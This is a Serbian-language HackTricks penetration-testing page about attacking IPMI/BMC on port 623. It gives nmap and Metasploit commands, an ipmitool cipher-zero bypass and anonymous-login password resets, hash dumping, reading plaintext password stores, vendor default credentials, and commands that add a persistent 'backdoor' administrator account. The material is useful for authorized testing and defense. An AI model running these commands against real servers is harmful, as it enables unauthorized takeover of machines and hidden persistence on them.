# 623/UDP/TCP - IPMI

## 623/UDP/TCP - IPMI

<details>

<summary><strong>Nau캜ite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi na캜ini podr코ke HackTricks-u:

* Ako 쬰lite da vidite **va코u kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvani캜ni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na코u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 游냕 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## Osnovne informacije

### **Pregled IPMI-ja**

**[Inteligentni interfejs za upravljanje platformom (IPMI)](https://www.thomas-krenn.com/en/wiki/IPMI_Basics)** nudi standardizovan pristup za daljinsko upravljanje i nadgledanje ra캜unarskih sistema, nezavisno od operativnog sistema ili stanja napajanja. Ova tehnologija omogu캖ava sistem administratorima da upravljaju sistemima daljinski, 캜ak i kada su isklju캜eni ili neodzivni, i posebno je korisna za:

- Konfiguracije pre pokretanja operativnog sistema
- Upravljanje isklju캜ivanjem
- Obnova nakon neuspeha sistema

IPMI je sposoban da nadgleda temperature, napon, brzinu ventilatora i napajanja, kao i da pru쬬 informacije o inventaru, pregleda logove hardvera i 코alje upozorenja putem SNMP-a. Za njegov rad su neophodni izvor napajanja i LAN veza.

Od svog predstavljanja od strane Intela 1998. godine, IPMI je podr쬬n od strane brojnih prodavaca, pobolj코avaju캖i mogu캖nosti daljinskog upravljanja, posebno sa podr코kom verzije 2.0 za serijski preko LAN-a. Klju캜ni komponenti uklju캜uju:

- **Baseboard Management Controller (BMC):** Glavni mikrokontroler za IPMI operacije.
- **Komunikacione magistrale i interfejsi:** Za internu i eksternu komunikaciju, uklju캜uju캖i ICMB, IPMB i razli캜ite interfejse za lokalne i mre쬹e veze.
- **IPMI memorija:** Za skladi코tenje logova i podataka.

![https://blog.rapid7.com/content/images/post-images/27966/IPMI-Block-Diagram.png#img-half-right](https://blog.rapid7.com/content/images/post-images/27966/IPMI-Block-Diagram.png#img-half-right)

**Podrazumevani port**: 623/UDP/TCP (Obi캜no se koristi UDP, ali mo쬰 se koristiti i TCP)

## Enumeracija

### Otkrivanje
```bash
nmap -n -p 623 10.0.0./24
nmap -n-sU -p 623 10.0.0./24
use  auxiliary/scanner/ipmi/ipmi_version
```
Mo쬰te **identifikovati** verziju koriste캖i:
```bash
use auxiliary/scanner/ipmi/ipmi_version
nmap -sU --script ipmi-version -p 623 10.10.10.10
```
### IPMI Ranjivosti

U domenu IPMI 2.0, otkrivena je zna캜ajna sigurnosna propustljivost od strane Dana Farmera, koja otkriva ranjivost putem **코ifarskog tipa 0**. Ova ranjivost, detaljno dokumentovana na [Dan Farmerovom istra쬴vanju](http://fish2.com/ipmi/cipherzero.html), omogu캖ava neovla코캖eni pristup sa bilo kojom lozinkom, pod uslovom da je ciljani korisnik validan. Ova slabost je prona캠ena na razli캜itim BMC-ovima od proizvo캠a캜a kao 코to su HP, Dell i Supermicro, 코to ukazuje na 코iroko rasprostranjenu problematiku unutar svih implementacija IPMI 2.0.

### **IPMI Bypass autentifikacije putem 코ifre 0**

Da biste otkrili ovu manu, mo쬰te koristiti slede캖i Metasploit pomo캖ni skener:
```bash
use auxiliary/scanner/ipmi/ipmi_cipher_zero
```
Eksploatacija ove gre코ke je mogu캖a pomo캖u `ipmitool`-a, kao 코to je prikazano u nastavku, omogu캖avaju캖i listanje i izmenu korisni캜kih lozinki:
```bash
apt-get install ipmitool # Installation command
ipmitool -I lanplus -C 0 -H 10.0.0.22 -U root -P root user list # Lists users
ipmitool -I lanplus -C 0 -H 10.0.0.22 -U root -P root user set password 2 abc123 # Changes password
```
### **IPMI 2.0 RAKP Autentifikacija - Preuzimanje udaljenog he코a lozinke**

Ova ranjivost omogu캖ava preuzimanje soljenih he코iranih lozinki (MD5 i SHA1) za bilo koji postoje캖i korisni캜ki nalog. Da biste testirali ovu ranjivost, Metasploit nudi modul:
```bash
msf > use auxiliary/scanner/ipmi/ipmi_dumphashes
```
### **IPMI Anonimna Autentifikacija**

Podrazumevana konfiguracija u mnogim BMC-ovima omogu캖ava "anonimni" pristup, koji se karakteri코e praznim korisni캜kim imenom i lozinkom. Ova konfiguracija mo쬰 biti iskori코캖ena za resetovanje lozinki korisni캜kih naloga koji imaju imena koriste캖i `ipmitool`:
```bash
ipmitool -I lanplus -H 10.0.0.97 -U '' -P '' user list
ipmitool -I lanplus -H 10.0.0.97 -U '' -P '' user set password 2 newpassword
```
### **Supermicro IPMI lozinke u 캜istom tekstu**

Kriti캜an dizajnerski izbor u IPMI 2.0 zahteva skladi코tenje lozinki u 캜istom tekstu unutar BMC-a u svrhu autentifikacije. Supermicro-ovo skladi코tenje ovih lozinki na lokacijama poput `/nv/PSBlock` ili `/nv/PSStore` izaziva zna캜ajne sigurnosne probleme:
```bash
cat /nv/PSBlock
```
### **Supermicro IPMI UPnP Vulnerabilnost**

Uklju캜ivanje Supermicro UPnP SSDP slu코a캜a u IPMI firmware, posebno na UDP portu 1900, predstavlja ozbiljan sigurnosni rizik. Ranjivosti u Intel SDK za UPnP ure캠aje verzije 1.3.1, kako je detaljno opisano u [Rapid7-ovom otkrivanju](https://blog.rapid7.com/2013/01/29/security-flaws-in-universal-plug-and-play-unplug-dont-play), omogu캖avaju pristup root nalogu BMC-a:
```bash
msf> use exploit/multi/upnp/libupnp_ssdp_overflow
```
### Brute Force

**HP nasumi캜no generi코e podrazumevanu lozinku** za svoj proizvod **Integrated Lights Out (iLO)** tokom proizvodnje. Ova praksa se razlikuje od drugih proizvo캠a캜a koji obi캜no koriste **stati캜ne podrazumevane akreditive**. Pregled podrazumevanih korisni캜kih imena i lozinki za razli캜ite proizvode je slede캖i:

- **HP Integrated Lights Out (iLO)** koristi **fabri캜ki generisanu nisku od 8 karaktera** kao podrazumevanu lozinku, 코to pokazuje ve캖i nivo bezbednosti.
- Proizvodi poput **Dell-ovog iDRAC-a, IBM-ovog IMM-a** i **Fujitsu-ovog Integrated Remote Management Controller-a** koriste lako pogodne lozinke poput "calvin", "PASSW0RD" (sa nulom) i "admin" redom.
- Sli캜no tome, **Supermicro IPMI (2.0), Oracle/Sun ILOM** i **ASUS iKVM BMC** tako캠e koriste jednostavne podrazumevane akreditive, pri 캜emu su njihove lozinke "ADMIN", "changeme" i "admin" redom.


## Pristupanje Hostu putem BMC-a

Administrativni pristup Baseboard Management Controller-u (BMC) otvara razli캜ite puteve za pristup operativnom sistemu hosta. Jednostavan pristup uklju캜uje iskori코캖avanje funkcionalnosti BMC tastature, video zapisa i mi코a (KVM). To se mo쬰 posti캖i ili ponovnim pokretanjem hosta do root ljuske putem GRUB-a (kori코캖enjem `init=/bin/sh`) ili pokretanjem sa virtuelnog CD-ROM-a postavljenog kao spasila캜ki disk. Ove metode omogu캖avaju direktno manipulisanje diskom hosta, uklju캜uju캖i umetanje zadnjih vrata, izvla캜enje podataka ili bilo koje neophodne radnje za procenu bezbednosti. Me캠utim, to zahteva ponovno pokretanje hosta, 코to je zna캜ajan nedostatak. Bez ponovnog pokretanja, pristupanje pokrenutom hostu je slo쬰nije i razlikuje se u zavisnosti od konfiguracije hosta. Ako je fizi캜ka ili serijska konzola hosta ostala prijavljena, lako je preuzeti kontrolu putem BMC-ovih KVM ili serijsko-preko-LAN (sol) funkcionalnosti putem `ipmitool`-a. Istra쬴vanje iskori코캖avanja deljenih hardverskih resursa, poput i2c magistrale i Super I/O 캜ipa, je oblast koja zahteva dalje istra쬴vanje.

## Uvo캠enje zadnjih vrata u BMC sa hosta

Nakon kompromitovanja hosta opremljenog BMC-om, **lokalno BMC su캜elje mo쬰 se iskoristiti za umetanje korisni캜kog naloga zadnjih vrata**, stvaraju캖i trajno prisustvo na serveru. Ovaj napad zahteva prisustvo **`ipmitool`-a** na kompromitovanom hostu i aktivaciju podr코ke za BMC drajvere. Slede캖e komande ilustruju kako se novi korisni캜ki nalog mo쬰 ubaciti u BMC koriste캖i lokalno su캜elje hosta, 코to zaobilazi potrebu za autentifikacijom. Ova tehnika se mo쬰 primeniti na 코irok spektar operativnih sistema, uklju캜uju캖i Linux, Windows, BSD i 캜ak DOS.
```bash
ipmitool user list
ID  Name        Callin  Link Auth    IPMI Msg  Channel Priv Limit
2  ADMIN            true    false      false      Unknown (0x00)
3  root            true    false      false      Unknown (0x00)

ipmitool user set name 4 backdoor
ipmitool user set password 4 backdoor
ipmitool user priv 4 4
ipmitool user list
ID  Name        Callin  Link Auth    IPMI Msg  Channel Priv Limit
2  ADMIN            true    false      false      Unknown (0x00)
3  root            true    false      false      Unknown (0x00)
4  backdoor        true    false      true      ADMINISTRATOR
```
## Shodan

* `port:623`

## Reference

* [https://blog.rapid7.com/2013/07/02/a-penetration-testers-guide-to-ipmi/](https://blog.rapid7.com/2013/07/02/a-penetration-testers-guide-to-ipmi/)

<details>

<summary><strong>Nau캜ite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi na캜ini podr코ke HackTricks-u:

* Ako 쬰lite da vidite **va코u kompaniju reklamiranu u HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvani캜ni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na코u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 游냕 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
